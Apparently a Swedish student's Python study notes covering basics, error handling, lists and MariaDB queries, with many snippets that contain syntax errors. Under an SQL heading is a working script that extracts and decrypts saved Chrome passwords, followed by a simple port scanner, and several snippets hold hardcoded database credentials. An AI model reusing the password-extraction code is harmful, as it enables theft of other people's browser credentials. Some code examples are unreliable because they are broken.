print("hello world")
#Print visar utmatning till sin konsoll


name = input("please enter your name: ")
#Input gör att man frågar klienten om något. Eller får information om klienten

print("hello world")
()
print("did you see that blank line?")
print(blank line \nin the middle of sting")
#Att sätta en () mellan gör att det blir lättare att se samt att det skapar mellan rum mellan raderna. Att skriva \n gör att texten blir delad, så den ena stannar 
#och den andra delan åker ner ett steg. 

#Ett av skälen varför print är så bra är för att man kan använda det för "debugga". 

#För att datorn ska förstå att det är Python vi arbetar med så måste man spara filen man skapat med .py . 
#Då kommer det även få färger som gör det lättare att se om det är rätt eller inte. 


name = input("what is your name?")
print("hello")
print(name)
#Detta var mitt första skrip, "name" är variabelen och "input" är frågan. Detta gör att när jag kör skripted så kommer den fråga efter mitt namn som jag kan svara på. 
#När jag gjort detta så kommer den att svar med hello. 
#Att skriva "cls" gör att man rensar teminalen. 

x = 1+1
y = x /0
print("Matte")
#Om man skriver en code som är felktig som så som ovan så kommer "debugga" att gå igång och säga till att det är fel: SyntaxError:
"ZeroDivisionError: division by zero" då det inte går att dela med 0.
#Det står även vilken rad som det blev fel på: "line 2, in <module>"
#Ett annat tips är att om man skriver print och förklarar vad man gör efter varje code så är det lätt att se vad man håller på med. tex. print("adding numbers"),print("dividing numbers")

CTRL+K+C CTRL+K+U
#Dessa två är för att göra en text till en kommentar: CTRL+K+C eller till en code: CTRL+K+U

#Vad är en string?
#Det är något man lägger i en variabel, en variabel är en platshållare för code för "values". 
#Om man har två strings och till sätta ihop dessa så behöver man bara lägga till "+"tecknet. 
#Exempel på detta är:
first_name = "Fredrik"                (-value)
last_name = "Rantanen"                (-value)
print (first_name + last_name)
print ("hello" + first_name + " " + last_name)
#Det jag får ut av detta är:
FredrikRantanen
helloFredrik Rantanen

#Funktioner
#Om man vill modifya en sting kan man använda sig av Funktioner. Exempel:
sentence = "The dog is named Sammy"
print(sentence.upper())
print(sentence.lower())
print(sentence.capitalize())
print(sentence.count("a"))
#Det vi gör här är att ändra på en sting, kom ihåg det jag skrev ovan, något man lägger i en variabel. Man kan se vad jag vill ändra lätt om man kollar och svaret blir:
THE DOG IS NAMED SAMMY
the dog is named sammy
The dog is named sammy
2
#Om vi nu ska lägga samma allt vi lärt oss tills nu så kan vi göra något som: 
first_name = input("What is your first name?")
last_name = input("What is your last name?")
print("Hello" + first_name.capitalize() + " " + last_name.capitalize()) 
#Så input ger "value" till "first_name" samt last_name. Sedan vill vi säga "Hello" + first_name och last_name med hjälp av print. 
#De gör ingen skillnad på om man skriver svaret den frågar med stora eller små bokstäver då vi satte ".capitalize" längst bak på "first_name" och "last_name" Exempel:
What is your first name?Fredrik
What is your last name?RANTANEN
HelloFredrik Rantanen
#Svaret blir fortfarande små bokstäver. 

#first_name = "Marcus"
#last_name = "Korvsson"
first_name = input("Enter name here:")
last_name = input("Enter last name here:")

#print(first_name + last_name)

print("Hello, " + first_name.lower() + " " + last_name.upper())
#Något jag missade här var att lägga () efter lower och upper, detta gjorde att min kod inte fungerade, jag felsökte detta med "debugging". 
#Man kan även se om det är grönt under sin code att något är fel med denna. 

#{} <-- Dessa är "placeholder", so om man lägger tex {0} det börjar alltid från 0 och sedan {1} så kan jag specificera vart {0} och {1} ska vara i min variabel. 
#F = Format

first_name = "Marcus"
last_name = "Korvsson"

#output = "hello, " + first_name + " " + last_name
output = "hello, {} {}" .format(first_name, last_name)
print (output)
eller 
first_name = "Marcus"
last_name = "Korvsson"

#output = "hello, " + first_name + " " + last_name
#output = "hello, {1}, {0}" .format(first_name, last_name)
output = f"Hello, {first_name} {last_name}"
print (output)
#Man kan skriva code och få ut samma resulat på olika sätt, ovan är två olika exempel på detta.

#Convert number to string!
days_in_feb = 28 
print(str(days_in_feb) + "days in february")
#För att python ska förstå, tex om jag skirver som över utan "str" så vet inte datorn om den ska plussa dessa eller om den ska ge svar att det är 28 dagar i february. 
#Därför använder man "str", speciellt när man jobbar med nummer. 

#Convert string to number!
first_num = "5"
second_num = "6"
print(first_num + second_num)
56
#Ovan så lägger jag till två olika number så det blir 56, om jag vill att det bara ska plussa ihop så det bli 11 behöver jag skriva på detta sätt istället. 
first_num = "5"
second_num = "6"
print(int(first_num) + int(second_num))
11
#Man kan även använda sig av "float" då handlar det om decimaler. 
print(float(first_num) + int(second_num))
11.0

first_num = input("Please enter number here:")
second_num = input("please enter number here:")
print (float(first_num) + float(second_num))
Please enter number here:5
please enter number here:6
11.0

days_in_february = 28
print(days_in_february + " total days in february")
#Om jag skriver på detta sätt så kommer jag få svaret: 
TypeError: unsupported operand type(s) for +: 'int' and 'str'
#Detta för att den har ett nummer och en string. Vi måste säga till den att den ska använda str (string funtktion) för att convert den till en string data typ. 
days_in_february = 28
print(str(days_in_february) + " total days in february")
28 total days in february

#Date and time
För att få "current" date och time in i min code så behöver använda mig av en så kallat "libary" för att få ner detta. 
from datetime import datetime
today = datetime.now()
print("today is: " + str(today))
today is: 2019-10-27 21:30:48.946781
#Notera att jag var tvungen att skriva "from datetime import datetime" som inte fanns med i guiden jag följde. Den ville bara att jag skulle skive "inport" 
from datetime import datetime
today = datetime.now()
print("today is: " + str(today))

from datetime import timedelta
one_day = timedelta(days=1)
yesterday = today - one_day
print("yesterday was: " +str(yesterday))
today is: 2019-10-27 21:38:38.017904
yesterday was: 2019-10-26 21:38:38.017904
#timedelta = hur många dagar från denna dag eller hur många veckor från idag något ska eller kan hända. 
#Man kan ändra "("yesterday was: " +str(yesterday))" till days,weeks,sekunder,minuter. Kul att leka med. 
from datetime import datetime
current_date = datetime.now()
print("day: " + str(current_date))
print("week " + str(current_date))
print("month " + str(current_date))
day: 2019-10-27 21:51:27.543869
week 2019-10-27 21:51:27.543869
month 2019-10-27 21:51:27.543869
#Lite mer träning ang timedelta
from datetime import datetime, timedelta
Today = datetime.now()
print("Today is: " + str(Today))
one_day = timedelta (days=1)
yesterday =Today - one_day
print("yesterday was: " + str(yesterday))

one_week = timedelta(weeks=1)
last_week = Today - one_week
print("Last week was: " + str(last_week))¨
Today is: 2019-10-28 09:53:17.167931
yesterday was: 2019-10-27 09:53:17.167931
Last week was: 2019-10-21 09:53:17.167931
#mer
from datetime import datetime, timedelta
Today = datetime.now()
print("Today is: " + str(Today))
one_day = timedelta (days=1)
yesterday =Today - one_day
print("yesterday was: " + str(yesterday))

one_week = timedelta(weeks=1)
last_week = Today - one_week
print("Last week was: " + str(last_week))

print("Hour: " +str (Today.hour))
print("minute: " +str (Today.minute))
print("secund: " +str (Today.second))
Today is: 2019-10-28 11:33:37.623303
yesterday was: 2019-10-27 11:33:37.623303
Last week was: 2019-10-21 11:33:37.623303
Hour: 11
minute: 33
secund: 37

#Error handeling och debugging. 
#Dessa två är helt olika saker, Error handeling är något jag inte kommer kunna förutse när det kommer ut i produktion tex premission issue, database changeing, server being down etc.
#Debugging är när jag vet att jag har något/ett problem med min code. 
#Errors har tre olika typer, "SyntaxError", "Runtime Errors", "Logic Errors". 
    - SyntaxError: Dessa är bra Errors för de säger vart det är fel i koden. 
x = 42 
y = 206 
if x == y 
print("success!!")
    if x == y
             ^
SyntaxError: invalid syntax

    -Runtime Error: Det är det näst bästa att få, de kommer ge lite information om vart man ska börja, i detta fall "line 4". 
x = 42 
y = 0
print (x/y) 
File "c:/Users/Ace/Documents/Python scrips/helloworld.py", line 4, in <module>
    print (x/y)
ZeroDivisionError: division by zero

Logic Error
    -Det är när man inte får svaret man förväntade sig eller vill ha. 

Try: 
Med try block: kan du testa ett kodblock för fel.
The except: låter dig hantera felet.

The finally: blocket låter dig köra kod, oavsett resultatet av försök och förutom block.

Exempel på detta är: 
x = 42
y = 0

print()
try:
    print(x / y)
except ZeroDivisionError as e:
    print("Not allowed to divide by zero")
else:
    print("Something else went wrong")
finally:
    print("This is our cleanup code.")

Not allowed to divide by zero
This is our cleanup code.

#Handeling conditions! 
#När något händer, gör detta. Om något annat händer, reagera på ett annat sätt. 
#Det ovan är en snabb verision om vad handeling conditions är. 
> Greater than
< Less then
>= Greater than or equal
<= Less than or equal to
== is equal to
!= is not equal to 

if price >= 1.00: 
    tax = .07
else: tax
    tax = 0
    print(tax)

#Conditional Logic.
#villkorsbisats logic.Conditional logic is the decision making arm of programming. With conditional logic, we examine a condition and instruct the computer what to do based on 
#the condition. 
#If you have had any exposure to computer programming, the IF THEN statement should immediately come to mind here. 


price = input( "how much did you play?" )

price = float(price)
if price >= 1.00:
    tax = .07
    print("tax rate is: " + str(tax))
else:
    tax = 0
    print ("Tax rate is: " + str())
how much did you play?0.5
Tax rate is:
eller
how much did you play?10000
tax rate is: 0.07

#Elif
#elif är som "else" och "if" tillsammans, tex "if" det är något så brukar man skriva "else" efter. Ist skriver vi elif. 
#Detta är bra om bara ett "condition" behöver bli mött. 
if province == "Alberta":  #Om det inte är denna kolla nästa
        tax = 0.05
elif province == "Nunavut":  #Om det inte är denna kolla nästa
    tax == 0.05
elif province == "Ontario":   #Om det inte är denna kolla nästa 
    tax = 0.13 
else:                          #Annars gör detta. 
    tax = 0.15% 
#Kolla detta för bättre förståelse ang hur man använder "elif" och "else". 
#Det går även att använda sig av "or" eller "in" statement te.x 
if province == "Alberta" \
    or province == "Nunavut":
    tax == 0.05
elif province == "Ontario":
    tax = 0.13 
else: 
    tax = 0.15
#Eller:
if province == in("Alberta", \ 
"Nunavut","Yukon"): 
    tax == 0.05
elif province == "Ontario":
    tax = 0.13 
else: 
    tax = 0.15
#YT kommentar: also helpful to know is that is that python will skip evaluating the 2nd statement in an OR if the first statement comes back as TRUE, 
#so you could put the more resource-intensive evaluation as the 2nd statement to save some computer resources.
# \ i texten är för att tillåta att sätta en kodrad på två rader för att underlätta läsbarheten.
if country == "Canada":
    if province in("Alberta",\
        "Nunavut","Yukon"): 
    tax == 0.05
elif province == "Ontario":
    tax = 0.13 
else: 
    tax = 0.15

# and statment: Vad är det? 
if pga >= .85: and lowest_grade >= .70:
    print("Well done")
#Om båda dessa är sant när man fyller i tex två frågor så kommer den svara "true". Men om någon av dom är "false" så kommer svaret bli false. 
#Use the AND function, one of the logical functions, to determine if all conditions in a test are TRUE.

#Boolean variabel
#Holds values that can be only True or False. The keywords True and False correspond to the two states of Boolean variables.
#jag tyckte denna gav en bra bild på hur det funkar. 
my_string = "Hello World"

my_string.isalnum()		#check if all char are numbers
my_string.isalpha()		#check if all char in the string are alphabetic
my_string.isdigit()		#test if string contains digits
my_string.istitle()		#test if string contains title words
my_string.isupper()		#test if string contains upper case
my_string.islower()		#test if string contains lower case
my_string.isspace()		#test if string contains spaces
my_string.endswith('d')		#test if string endswith a d
my_string.startswith('H')	#test if string startswith H

To see what the return value (True or False) will be, simply print it out.	

my_string="Hello World"

print my_string.isalnum()		#False
print my_string.isalpha()		#False
print my_string.isdigit()		#False
print my_string.istitle()		#True
print my_string.isupper()		#False
print my_string.islower()		#False
print my_string.isspace()		#False
print my_string.endswith('d')		#True
print my_string.startswith('H')		#True
#Annars kan man skriva på detta sätta
if pga >= .85: and lowest_grade >= .70:
   honour_roll = True
else:
    honour_roll = False 
if honour_roll:
    print("Well done")
    

#List, hur man gör det och vad det är
#Här är ett exempel på en lista 
names = ["Marcus" , "Jenny"]
print (names)
['Marcus', 'Jenny']
#När man anväder [] och sedan , så kan man skapa en lista som ovan. 
scores = []
scores.append(98) #add new item to the end
scores.append(99) #append betyder bifoga
print(scores)     #Så det vi gör är att vi bifogar scores på en lista då vi använder [] 
print(scores[1]) #Collections are zero-indexed "börjar alltid från 0 i py"

#array, vad är det, vad är det för skillnad mellan array och list? 
from array import array # impoterat. 
scores = array("d")     #Här väljer jag ut vilken typ av array jag vill använda, i detta fall "d". "d" står för digits. 
scores.append(97)        
scores.append(98)       
print(scores)           
print(scores[1])    

array('d', [97.0, 98.0])
98.0     
#Det första vi måste göra är att impotera array, lika som vi gjorde tidigare med "time" innan. (from datetime import datetime, timedelta)
#Arrays are used to store multiple values in one single variable: cars = ["Ford", "Volvo", "BMW"]. An array is a special variable, which can hold more than one value at a time.
#You can use the append() method to add an element to an array.
#Array Methods
#Python has a set of built-in methods that you can use on lists/arrays.

#Method	Description
#append()	Adds an element at the end of the list
#clear()	Removes all the elements from the list
#copy()	Returns a copy of the list
#count()	Returns the number of elements with the specified value
#extend()	Add the elements of a list (or any iterable), to the end of the current list
#index()	Returns the index of the first element with the specified value
#insert()	Adds an element at the specified position
#pop()	Removes the element at the specified position
#remove()	Removes the first item with the specified value
#reverse()	Reverses the order of the list
#sort()	Sorts the list
#Note: Python does not have built-in support for Arrays, but Python Lists can be used instead.

List, vad är det? A list is a collection which is ordered and changeable. In Python lists are written with square brackets.
names = ["susan" , "christopher"]
print(len(names)) #Get the number of items (len betyder lenght)
names.insert(0, "bill") #inster before index, nu lägger vi till bill med instert och gör att han hanar först med hjälp av "0"
print(names) 
names.sort() #sort är bokstavsordniong. 
print(names)
2 #Visar att det va två "items" jag satt in i början. 
['bill', 'susan', 'christopher'] 
['bill', 'christopher', 'susan'] #här ser man att det kom i rätt ordning. 
#NyttRetriving ranges 
names = ["susan" , "christopher" , "Bill"] #two items 
presenters = names [0:2] #Get the first two items. 
print(names)
print(presenters)

['susan', 'christopher', 'Bill'] 
['susan', 'christopher'] #Då vi skrev presenters innan så tar vi bara ut de två första med hjälp av [0:2] asså 0-2. 

#Dictionary : A dictionary is a collection which is unordered, changeable and indexed. 
#In Python dictionaries are written with curly brackets, and they have keys and values.
marcus = {}
marcus["first"] = "marcus"
marcus["last"] = "Jessica"
Susan = {"fisrt" : "Jessica", "last": "Max"} 
print(marcus)

{'first': 'marcus', 'last': 'Jessica'}


Skol uppgift
y = 3
z = 4
def print_stuff():
   print ("Calling print_stuff")
   print (y)
   
   print (z)
   print("exiting print_stuff")
	
print_stuff() # we call print_stuff and the program execution goes to (***)
print(y) # works fine
print (z) # NameError!!!

SQL anteckningar.___________________________________________________________________________________________________________
import os
import sqlite3
import win32crypt

from shutil import copyfile

path = os.getenv("LOCALAPPDATA") + "\Google\Chrome\\User Data\Default\Login Data"
path2 = os.getenv("LOCALAPPDATA") + "\Google\Chrome\\User Data\Default\Login2"
copyfile(path,path2)

conn = sqlite3.connect(path2)

c = conn.cursor()

c.execute('SELECT action_url, username_value, password_value FROM logins')

for bla in c.fetchall():
    print ((bla[0] + '\n' + bla[1]))

    password = win32crypt.CryptUnprotectData(bla[2])[1]
    print(password)
    f = open("myPythonpasswords.txt", "w")
conn.close()
      
PORTSCANNER
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

target = input("skriv ditt ip att scanna:")


def portscan(port):
        try:
            connect= s.connect((target,port))
            return True
        except:
            return False


for ports in range(1,100):
    if portscan(ports):
        print('Port',ports, "Är öppen")

     
  MARIADB_________________________________________________________________________
  #!usr/bin/python3 #Databas

import mysql.connector as mariadb

mariadb_connection = mariadb.connect(
    user='root',
    password='xenter19',
    database='test')
    
        
cursor = mariadb_connection.cursor()
cursor.execute("USE test")
cursor.execute("SHOW TABLES")
result = cursor.fetchall()
print(result)

for x in result:
    print(x)
      
 & Tables
import mysql.connector
import mysql.connector as mariadb


mariadb = mysql.connector.connect(
  user="root",
  passwd="xenter19",
  database="test"
)

cursor = mariadb.cursor()

cursor.execute("CREATE TABLE customers (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255), address VARCHAR(255))")
      
& insert
import mysql.connector

mydb = mysql.connector.connect(
  user="root",
  passwd="xenter19",
  database="test"
)

mycursor = mydb.cursor()

sql = "INSERT INTO customers (name, address) VALUES (%s, %s)"
val = ("John", "Highway 21")
mycursor.execute(sql, val)

mydb.commit()

print(mycursor.rowcount, "record inserted.")

& insert multi tables 
 import mysql.connector

mydb = mysql.connector.connect(
  user="root",
  passwd="xenter19",
  database="test"
)


mycursor = mydb.cursor()

sql = "INSERT INTO customers (name, address) VALUES (%s, %s)"
val = [
  ('Peter', 'Lowstreet 4'),
  ('Amy', 'Apple st 652'),
  ('Hannah', 'Mountain 21'),
  ('Michael', 'Valley 345'),
  ('Sandy', 'Ocean blvd 2'),
  ('Betty', 'Green Grass 1'),
  ('Richard', 'Sky st 331'),
  ('Susan', 'One way 98'),
  ('Vicky', 'Yellow Garden 2'),
  ('Ben', 'Park Lane 38'),
  ('William', 'Central st 954'),
  ('Chuck', 'Main Road 989'),
  ('Viola', 'Sideway 1633')
]

mycursor.executemany(sql, val)

mydb.commit()

      
Insert ID
import mysql.connector

mydb = mysql.connector.connect(
  user="root",
  passwd="xenter19",
  database="test"
)

mycursor = mydb.cursor()

sql = "INSERT INTO customers (name, address) VALUES (%s, %s)"
val = ("Michelle", "Blue Village")
mycursor.execute(sql, val)

mydb.commit()

print("1 record inserted, ID:", mycursor.lastrowid)

& SELECT STATMENT
import mysql.connector

mydb = mysql.connector.connect(
  user="root",
  passwd="xenter19",
  database="test"
)


mycursor = mydb.cursor()

mycursor.execute("SELECT name, address FROM customers")

myresult = mycursor.fetchall()


for x in myresult:
 & fetch one object 
      
  import mysql.connector

mydb = mysql.connector.connect(
  user="root",
  passwd="xenter19",
  database="test"
)

mycursor = mydb.cursor()

mycursor.execute("SELECT * FROM customers")

myresult = mycursor.fetchone()

print(myresult)
      
 & filter by
 mycursor = mydb.cursor()

sql = "SELECT * FROM customers WHERE address ='Park Lane 38'"

mycursor.execute(sql)

myresult = mycursor.fetchall()

for x in myresult:
  print(x)
&Wildcard 
mycursor = mydb.cursor()

sql = "SELECT * FROM customers WHERE address LIKE '%way%'"

mycursor.execute(sql)

myresult = mycursor.fetchall()

for x in myresult:
  print(x)
  
  #Detta gör att allt med "Way" kommer fram i CMD skriptet.
      
 & prevent sql injection 

sql = "SELECT * FROM customers WHERE address = %s"
adr = ("Yellow Garden 2", )

mycursor.execute(sql, adr)

myresult = mycursor.fetchall()

for x in myresult:
  print(x)

#When query values are provided by the user, you should escape the values.

#This is to prevent SQL injections, which is a common web hacking technique to destroy or misuse your database.

#The mysql.connector module has methods to escape query values:

#Escape query values by using the placholder %s method:
      
print(mycursor.rowcount, "was inserted.")
      
 &Delete statment 
      sql = "DELETE FROM customers WHERE address = 'Mountain 21'"

mycursor.execute(sql)

mydb.commit()

print(mycursor.rowcount, "record(s) deleted")

#Om jag vill ta bort något annat byter jag bara ut 'mountain 21 
#Important!: Notice the statement: mydb.commit(). It is required to make the changes, otherwise no changes are made to the table.

#Notice the WHERE clause in the DELETE syntax: The WHERE clause specifies which record(s) that should be deleted. 
#If you omit the WHERE clause, all records will be deleted!

#It is considered a good practice to escape the values of any query, also in delete statements.

#This is to prevent SQL injections, which is a common web hacking technique to destroy or misuse your database.

#The mysql.connector module uses the placeholder %s to escape values in the delete statement:  
      
 & Drop tables 
mycursor = mydb.cursor()
#sql = "DROP TABLE customers"
sql = "DROP TABLE IF EXISTS customers"

mycursor.execute(sql)

#You can delete an existing table by using the "DROP TABLE" statement:
#If the the table you want to delete is already deleted, or for any other reason does not exist, 
#you can use the IF EXISTS keyword to avoid getting an error.
      
 &Update table 
mycursor = mydb.cursor()

sql = "UPDATE customers SET address = 'Canyon 123' WHERE address = 'Valley 345'"

mycursor.execute(sql)

mydb.commit()

print(mycursor.rowcount, "record(s) affected")

#mysql.connector.errors.ProgrammingError: 1146 (42S02): Table 'test.customers' doesn't exist 
#Detta meddelandet kommer då vi tog bort denna i förra avsnittet.
      
&Limit the results 
mycursor.execute("SELECT * FROM customers LIMIT 5")
#mycursor.execute("SELECT * FROM customers LIMIT 5 OFFSET 2")
myresult = mycursor.fetchall()

for x in myresult:
  print(x)	
  
#You can limit the number of records returned from the query, by using the "LIMIT" statement:
#Om du vill returnera fem poster från och med den tredje posten kan du använda nyckelordet "OFFSET":
 
 &
      
      
      
      
      
      
      
      
      
      
 
